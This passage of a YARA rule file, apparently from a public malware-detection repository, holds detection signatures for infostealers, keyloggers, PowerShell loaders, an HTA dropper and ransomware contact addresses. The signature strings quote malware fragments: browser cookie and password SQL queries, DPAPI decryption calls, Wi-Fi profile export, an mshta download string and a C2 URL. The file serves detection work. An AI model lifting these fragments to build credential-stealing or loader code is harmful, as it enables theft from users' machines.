		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1188-L1208"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "689116f74996fecf4c16c224e8cd842ad5b5e989de2dfdf0debeb9a26d8a12fa"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "window.moveTo(-" ascii
		$s2 = "window.onerror = function(sMsg, sUrl, sLine) { return false; }" fullword ascii
		$s3 = "window.onfocus = function() { window.blur(); }" fullword ascii
		$s4 = "window.resizeTo(" ascii
		$s5 = "window.blur();" fullword ascii
		$hf1 = "<hta:application caption=\"no\" windowState=\"minimize\" showInTaskBar=\"no\"" fullword ascii
		$hf2 = "<hta:application caption=\"no\" showInTaskBar=\"no\" windowState=\"minimize\" navigable=\"no\" scroll=\"no\""
		$ht1 = "<hta:application" ascii
		$ht2 = "caption=\"no\"" ascii
		$ht3 = "showInTaskBar=\"no\"" ascii
		$ht4 = "windowState=\"minimize\"" ascii
		$ht5 = "navigable=\"no\"" ascii
		$ht6 = "scroll=\"no\"" ascii

	condition:
		all of ( $s* ) and ( 1 of ( $hf* ) or all of ( $ht* ) )
}

rule DITEKSHEN_MALWARE_Java_Pyrogenic
{
	meta:
		description = "Pyrogenic/Qealler infostealer payload"
		author = "ditekSHen"
		id = "2b9268f0-2f73-51ad-ab72-9289e42e5bb1"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L1434-L1446"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bb8cb939f06a376f72dcbbb1f04ec34526f72c3bcc3b146b905a8466826d2c24"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "bbb6fec5ebef0d93" ascii wide
		$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
		$s3 = "addShutdownHook" ascii wide
		$s4 = "obfuscated/META-INF/QeallerV" ascii wide
		$s5 = "globalIpAddress" ascii wide

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_Hawkeyev9
{
	meta:
		description = "Detects HawkEyeV9 payload"
		author = "ditekshen"
		id = "ca59aa45-fb55-5f9a-a224-8bd2b72ce5ac"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L2768-L2793"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d24111930dd0230c01963a90c9fbbc0a0a71df170c2ca116bb329e6158cb681c"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.HawkEyeV9"

	strings:
		$id1 = "HawkEye Keylogger - Reborn v9 - {0} Logs - {1} \\ {2}" wide
		$id2 = "HawkEye Keylogger - Reborn v9{0}{1} Logs{0}{2} \\ {3}{0}{0}{4}" wide
		$str1 = "_PasswordStealer" ascii
		$str2 = "_KeyStrokeLogger" ascii
		$str3 = "_ScreenshotLogger" ascii
		$str4 = "_ClipboardLogger" ascii
		$str5 = "_WebCamLogger" ascii
		$str6 = "_AntiVirusKiller" ascii
		$str7 = "_ProcessElevation" ascii
		$str8 = "_DisableCommandPrompt" ascii
		$str9 = "_WebsiteBlocker" ascii
		$str10 = "_DisableTaskManager" ascii
		$str11 = "_AntiDebugger" ascii
		$str12 = "_WebsiteVisitorSites" ascii
		$str13 = "_DisableRegEdit" ascii
		$str14 = "_ExecutionDelay" ascii
		$str15 = "_InstallStartupPersistance" ascii

	condition:
		int16 ( 0 ) == 0x5a4d and ( 1 of ( $id* ) or 5 of ( $str* ) )
}

rule DITEKSHEN_MALWARE_Win_Quilclipper
{
	meta:
		description = "Detects QuilClipper variants mostly in memory or extracted AutoIt script"
		author = "ditekSHen"
		id = "bd23ec5a-f21a-5133-a77a-de2615933b82"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4076-L4094"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dcac93806a438b188ae70a679301cb6630b9eb6849bf8fbbb1cea5fed5e7cf75"
		score = 75
		quality = 75
		tags = ""

	strings:
		$cnc1 = "QUILCLIPPER by" ascii
		$cnc2 = "/ UserName:" ascii
		$cnc3 = "/ System:" ascii
		$s1 = "DLLCALL ( \"kernel32.dll\" , \"handle\" , \"CreateMutexW\" , \"struct*\"" ascii
		$s2 = "SHELLEXECUTE ( @SCRIPTFULLPATH , \"\" , \"\" , FUNC_" ascii
		$s3 = "CASE BITROTATE" ascii
		$s4 = "CASE BITXOR" ascii
		$s5 = "CLIP( FUNC_" ascii
		$s6 = "CLIPPUT (" ascii
		$s7 = "FUNC _CLIPPUTFILE(" ascii
		$s8 = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Schedule" ascii

	condition:
		all of ( $cnc* ) or all of ( $s* )
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshkeylogger
{
	meta:
		description = "Detects PowerShell PoshKeylogger"
		author = "ditekSHen"
		id = "a816d716-caeb-5f08-9043-29db531f9e7c"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4612-L4627"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "20bde87ded7e3b68bc554c4b9a6c2ef08514f0d47b6b144763927bede81ea540"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "::GetKeyboardState" ascii
		$s2 = "GetAsyncKeyState(" ascii
		$s3 = "::MapVirtualKey(" ascii
		$s4 = "::GetAsyncKeyState" ascii
		$s5 = "Start-Sleep" ascii
		$s6 = "send-mailmessage" ascii
		$s7 = "[System.IO.File]::AppendAllText($" ascii
		$s8 = "new-object Management.Automation.PSCredential $" ascii

	condition:
		6 of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshwifistealer
{
	meta:
		description = "Detects PowerShell PoshWiFiStealer"
		author = "ditekSHen"
		id = "69ac123d-b746-57f1-a488-547f9a9cdd86"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4754-L4765"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "769349360b5d22226a5339a9e8471d06731dc522475c9385c1c145a0488e0ad1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh wlan export profile" ascii
		$s2 = "Send-MailMessage" ascii
		$u1 = "https://github.com/axel05869/Wifi-Grab" ascii
		$u2 = "/exploitechx/wifi-password-extractor" ascii

	condition:
		all of ( $s* ) or all of ( $u* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe01
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "fd44f48c-7a24-512b-8375-c9f978a8b5bd"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4907-L4920"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7dd377f6a1cc48ef8ab9d53989755fb967c89d3798b721781bc09043ba3d86f4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$rp1 = "GetType('RunPe.RunPe'" ascii
		$rp2 = "GetType(\"RunPe.RunPe\"" ascii
		$rm1 = "GetMethod('Run'" ascii
		$rm2 = "GetMethod(\"Run\"" ascii
		$s1 = ".Invoke(" ascii
		$s2 = "[Reflection.Assembly]::Load(" ascii

	condition:
		all of ( $s* ) and 1 of ( $rp* ) and 1 of ( $rm* )
}

rule DITEKSHEN_MALWARE_Win_Pwshloader_Runpe02
{
	meta:
		description = "Detects PowerShell PE loader / executer. Observed Gorgon TTPs"
		author = "ditekSHen"
		id = "08261054-bebc-58fe-949a-27f6e817003a"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L4922-L4934"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d7677689938d3e3eb6b59b99b7e347c60214f6edf8e5f83bf85da5a5f1ad33bb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "'.Replace('" ascii nocase
		$s2 = "'aspnet_compiler.exe'" ascii
		$s3 = "[Byte[]]$" ascii
		$pe1 = "(77,90," ascii
		$pe2 = "='4D5A" ascii

	condition:
		all of ( $s* ) and ( #pe1 > 1 or #pe2 > 1 ) and #s1 > 4
}

rule DITEKSHEN_MALWARE_Win_VBS_Dlagent01
{
	meta:
		description = "Detects VBS MSHTA downloader"
		author = "ditekSHen"
		id = "447ea323-ecab-5f6b-b13e-0690254c754e"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L5384-L5395"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e47839a55773764aca0aebcf1078c06c729b86d1e2f18d7d64e3bb11e87f3eb"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "llehS.tpircsW" ascii
		$s2 = ".Run" ascii
		$s3 = "mshta http" ascii nocase
		$s4 = "StrReverse" ascii

	condition:
		all of them
}

rule DITEKSHEN_MALWARE_Win_HUNT_Apostle
{
	meta:
		description = "Attempt on hunting new variants of Apostle"
		author = "ditekSHen"
		id = "31d15111-6935-5a77-ae9a-6bee16c1d2f6"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L8034-L8043"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9acab5dadee0760431376075450f54bbb32ebed10dc928db91a44d069afc1576"
		score = 50
		quality = 73
		tags = ""

	strings:
		$x1 = "://t.me/x4ran" ascii wide nocase
		$x2 = "43JuFUyzfcKQwTzCTHpQoA8uLGtbwFBLyeeXoYEEU5dZLhLT1cZJDk4cytjcgQT7kdjSerJqpEp2gUcH91bjLcoq2bqik3j" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_MALWARE_Win_Nplusminer
{
	meta:
		description = "Detects PowerShell based NPlusMiner"
		author = "ditekSHen"
		id = "a16b504f-e69a-5abb-8e37-01bf7c2df6ef"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L9051-L9064"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f6b81c2276765455d46e20ed81e19caa3ae36a31827568486a09bc1619ec478c"
		score = 75
		quality = 75
		tags = ""
		snort_sid = "920284"

	strings:
		$s1 = "$Core | Add-Member @{IsReadOnly = $((Get-ItemProperty -Path \".\\Includes\\Core.ps1\").IsReadOnly)} -Force" fullword ascii
		$s2 = "$Core | Add-Member @{MinerCustomConfig = $((Get-Content \".\\Config\\MinerCustomConfig.json\" -Raw))} -Force" fullword ascii
		$s3 = "If ($Variables.CheatGuy -and $Core.corehash -in $Hashes -and $Core.ScriptStartDate -le (Get-Date)" ascii
		$s4 = "Try{(Get-ItemProperty -Path \".\\Includes\\Core.ps1\").IsReadOnly = $false} catch {}" fullword ascii
		$s5 = " NPlusMiner/" ascii

	condition:
		3 of them
}

rule DITEKSHEN_MALWARE_Win_PWSH_Poshcookiestealer
{
	meta:
		description = "Detects PowerShell PoshCookieStealer"
		author = "ditekSHen"
		id = "7326a056-288b-534b-811d-172bd6936d7b"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L9066-L9080"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "234958098d09732675dd539e8d25c6754ba50bf92b3a19e7fef8c68d70503ec4"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "\\User Data\\default\\Network\\Cookies" ascii nocase
		$s2 = "Send-ToEmail" ascii
		$s3 = "[Security.Cryptography.ProtectedData]::Unprotect($" ascii
		$s4 = "$($env:LOCALAPPDATA)\\" ascii
		$s5 = "$($env:HOMEPATH)\\" ascii
		$s6 = "|ForEach-Object ToString X2) -join ''" ascii
		$s7 = ".Attachments.Add($" ascii

	condition:
		5 of them
}

rule DITEKSHEN_MALWARE_PWSH_CUMII
{
	meta:
		description = "Detects multi-dropper PowerShell"
		author = "ditekSHen"
		id = "07b77251-1d79-5521-8c05-ecfc662f45cb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L11070-L11086"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ab9e59b0552718928d170a988d129b38352700076847f2f409976016858864eb"
		score = 75
		quality = 75
		tags = ""
		clamav = "ditekSHen.MALWARE.PWSH.CUMII"

	strings:
		$s1 = ".('{1}{$}'.replace('$','0')" ascii nocase
		$s2 = ",'I').replace('!','ex')" ascii nocase
		$s3 = "'.replace('*','0001')" ascii nocase
		$s4 = "Remove-Item $" ascii nocase
		$s5 = "the File will start cumiing" ascii nocase
		$b1 = "011001100111010101101110011*" ascii
		$b2 = "0101001000*1110110*010011111" ascii
		$b3 = "01001101010110101001*11*0000" ascii

	condition:
		(3 of ( $s* ) and 1 of ( $b* ) )
}

rule DITEKSHEN_MALWARE_Win_Scouteliteps
{
	meta:
		description = "Detects actor PowerShell tool designed to steal browsers session cookie and passwords on-disk and in-memory"
		author = "ditekshen"
		id = "d2c04d55-9bf7-54f5-8053-835fa60f19cb"
		date = "2024-11-01"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/back-in-2017"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L11534-L11569"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9b1047b8b485fcfa29225f53674050703d32498cfa99654c8ac5f8bfac29878e"
		score = 75
		quality = 37
		tags = ""

	strings:
		$cnc1 = "http://beginpassport.com" ascii wide nocase
		$cnc2 = "f_dump.php" ascii wide nocase
		$cnc3 = "c_dump.php" ascii wide nocase
		$cnc4 = "o_dump.php" ascii wide nocase
		$db1 = "\\Google\\Chrome\\User Data\\Default\\Cookies" ascii wide nocase
		$db2 = "\\Mozilla\\Firefox\\Profiles\\*.default" ascii wide nocase
		$db3 = "\\Opera Software\\Opera Stable\\Cookies" ascii wide nocase
		$db4 = "$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default" ascii nocase
		$db5 = "$($env:APPDATA)\\Mozilla\\Firefox\\Profiles\\*.default" ascii nocase
		$db6 = "$($env:APPDATA)\\Opera Software\\Opera Stable" ascii nocase
		$cond1 = "SSID" ascii wide
		$cond2 = "MSPAuth" ascii wide
		$cond3 = "\"'T'\"" ascii wide
		$cond4 = "SNS_AA" ascii wide
		$cond5 = "X-APPLE-WEBAUTH-TOKEN" ascii wide
		$sql1 = "SELECT * FROM 'cookies' WHERE host_key LIKE $" ascii wide nocase
		$sql2 = "SELECT * FROM 'moz_cookies' WHERE host LIKE $" ascii wide nocase
		$sql3 = "SELECT origin_url, username_value ,password_value FROM 'logins'" ascii nocase
		$def1 = "Add-Type -AssemblyName System.Security" ascii wide nocase
		$def2 = "System.Security.SecureString" ascii wide nocase
		$def3 = "ConvertFrom-SecureString" ascii wide nocase
		$def4 = "[System.Security.Cryptography.ProtectedData]::Unprotect(" ascii wide nocase
		$def5 = "[Security.Cryptography.DataProtectionScope]::LocalMachine" ascii wide nocase
		$def6 = "[Security.Cryptography.DataProtectionScope]::CurrentUser" ascii wide nocase
		$def7 = "System.Data.SQLite.SQLiteConnection" ascii wide nocase
		$def8 = "[Environment]::OSVersion.ToString().Replace(\"Microsoft Windows \"," ascii wide nocase
		$def9 = "Start-Sleep" ascii wide nocase

	condition:
		(1 of ( $cnc* ) and any of ( $db* ) and any of ( $cond* ) and any of ( $sql* ) and 7 of ( $def* ) ) or ( all of them )
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lockergoga
{
	meta:
		description = "Detects files referencing identities associated with LockerGoga ransomware"
		author = "ditekShen"
		id = "ff257dae-d09b-52b3-93ca-68a560231b0d"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L60-L80"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f3474f92d935dda0d4c3b11b6934aede69ed949c8ba4d196bfe320476d39ac36"
		score = 75
		quality = 49
		tags = ""

	strings:
		$s1 = "abbschevis@protonmail.com" nocase ascii wide
		$s2 = "aperywsqaroci@o2.pl" nocase ascii wide
		$s3 = "asuxidoruraep1999@o2.pl" nocase ascii wide
		$s4 = "dharmaparrack@protonmail.com" nocase ascii wide
		$s5 = "ijuqodisunovib98@o2.pl" nocase ascii wide
		$s6 = "mayarchenot@protonmail.com" nocase ascii wide
		$s7 = "mikllimiteds@gmail.com0" nocase ascii wide
		$s8 = "phanthavongsaneveyah@protonmail.com" nocase ascii wide
		$s9 = "qicifomuejijika@o2.pl" nocase ascii wide
		$s10 = "rezawyreedipi1998@o2.pl" nocase ascii wide
		$s11 = "sayanwalsworth96@protonmail.com" nocase ascii wide
		$s12 = "suzumcpherson@protonmail.com" nocase ascii wide
		$s13 = "wyattpettigrew8922555@mail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Goldenaxe
{
	meta:
		description = "Detects files referencing identities associated with GoldenAxe ransomware"
		author = "ditekShen"
		id = "cd6486eb-742f-50fb-bd99-c5d778886477"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L82-L91"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "2540da85880dc08b51a2d096cefd8ed3cb14ccd171b71b434ccf26e7c5f1b54b"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "xxback@keemail.me" nocase ascii wide
		$s2 = "darkusmbackup@protonmail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Getcrypt
{
	meta:
		description = "Detects files referencing identities associated with GetCrypt ransomware"
		author = "ditekShen"
		id = "b5e31968-e626-5fbb-8bfe-942b48737367"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L93-L106"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "401f4e69235873adc271f8861912ec17daaa71a798c83df8cc3a9b88520708c9"
		score = 75
		quality = 63
		tags = ""

	strings:
		$s1 = "getcrypt@cock.li" nocase ascii wide
		$s2 = "cryptget@tutanota.com" nocase ascii wide
		$s3 = "cryptget@tutanota.com" nocase ascii wide
		$s4 = "offtitan@pm.me" nocase ascii wide
		$s5 = "offtitan@cock.li" nocase ascii wide
		$s6 = "un42@protonmail.com" nocase ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Cryptomix
{
	meta:
		description = "Detects files referencing identities associated with CryptoMix ransomware"
		author = "ditekShen"
		id = "7e623d06-36e8-576d-b261-d562eccf549b"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L108-L123"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "27b75a476229fc877c316f7a61d1ed647f5a67ac44a174d86c084063f039b20c"
		score = 75
		quality = 34
		tags = ""

	strings:
		$s1 = "portstatrelea1982@protonmail.om" ascii wide nocase
		$s2 = "unlock@eqaltech.su" ascii wide nocase
		$s3 = "unlock@royalmail.su" ascii wide nocase
		$s4 = "adexsin276@gmail.com" ascii wide nocase
		$s5 = "nbactocepnyou@protonmail.com" ascii wide nocase
		$s6 = "nunlock@eqaltech.su" ascii wide nocase
		$s7 = "nsnlock@royalmail.su" ascii wide nocase
		$s8 = "cersiacsofal@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Buran
{
	meta:
		description = "Detects files referencing identities associated with Buran ransomware"
		author = "ditekShen"
		id = "63cdda3f-78ed-5ce5-a8e0-e0893f2c314e"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L125-L140"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "685126efa7f90ce296fc616bd8d5d89a5b4b9aba8b60601b29534de21a0d0015"
		score = 75
		quality = 59
		tags = ""

	strings:
		$s1 = "recovery_server@protonmail.com" ascii wide nocase
		$s2 = "recovery1server@cock.li" ascii wide nocase
		$s3 = "polssh1@protonmail.com" ascii wide nocase
		$s4 = "polssh@protonmail.com" ascii wide nocase
		$s5 = "buransupport@exploit.im" ascii wide nocase
		$s6 = "buransupport@xmpp.jp" ascii wide nocase
		$s7 = "jacksteam2018@protonmail.com" ascii wide nocase
		$s8 = "notesteam2018@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ransomwareexx
{
	meta:
		description = "Detects files referencing identities associated with RansomwareEXX Linux ransomware"
		author = "ditekShen"
		id = "dfcff8cb-c50c-559e-b5b9-8c2cdac7a3dc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L142-L150"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a83ada5d29c6d62a292c4b3a1379558cddcaf63d97dbdfc6afd27cc52f6f656d"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "france.eigs@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Phobos
{
	meta:
		description = "Detects files referencing identities associated with Phobos ransomware"
		author = "ditekShen"
		id = "cee09220-4038-5190-b595-28f67c845588"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L152-L161"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cf9e163d2315d465afb47bf83f30d5d27e14c4cbbc1c235dcb15b75fb509ba7d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "helprecover@foxmail.com" ascii wide nocase
		$s2 = "recoverhelp2020@thesecure.biz" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Epsilon
{
	meta:
		description = "Detects files referencing identities associated with Epsilon ransomware"
		author = "ditekShen"
		id = "acdeb3b1-872b-5892-9dfe-2e506f767da2"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L163-L171"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "163694ed2ae181764fc6e62027487d183114be35a689dd44d4d9761149df244b"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "neftet@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Thanos
{
	meta:
		description = "Detects files referencing identities associated with Thanos ransomware"
		author = "ditekShen"
		id = "22ffb4c9-f113-5d3e-a466-6c384c0c6e8a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L173-L182"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "039ea384136a1aaa261702ed75ab9358aaa1ec2d5a8d35fe4789647f39490c7c"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "my-contact-email@protonmail.com" ascii wide nocase
		$s2 = "get-my-data@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Vovalex
{
	meta:
		description = "Detects files referencing identities associated with Vovalex ransomware"
		author = "ditekShen"
		id = "95e9ddce-8a19-59f1-baf4-bdac61c9c396"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L184-L192"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0e8b426e55c1efaf59e5f255f1da9cdfbb509561d3f7ea5baa2815c3131866eb"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "vovanandlexus@cock.li" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Alumnilocker
{
	meta:
		description = "Detects files referencing identities associated with AlumniLocker ransomware"
		author = "ditekShen"
		id = "64b6aff8-3758-5837-b814-e2505a9c12a3"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L194-L202"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "aeab9cb2b2da246e1863cd1102d901d322017d0b309e852d83e4f66f6e4bdd22"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "alumnilocker@protonmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Doejocrypt
{
	meta:
		description = "Detects files referencing identities associated with DoejoCrypt ransomware"
		author = "ditekShen"
		id = "bdf67fd3-8614-52f0-8804-9905f067a848"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L204-L213"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b76996ef413d017fa571115f7331154c808fed0f1b1e0c97241cadbbef260a00"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "konedieyp@airmail.cc" ascii wide nocase
		$s2 = "uenwonken@memail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Purge
{
	meta:
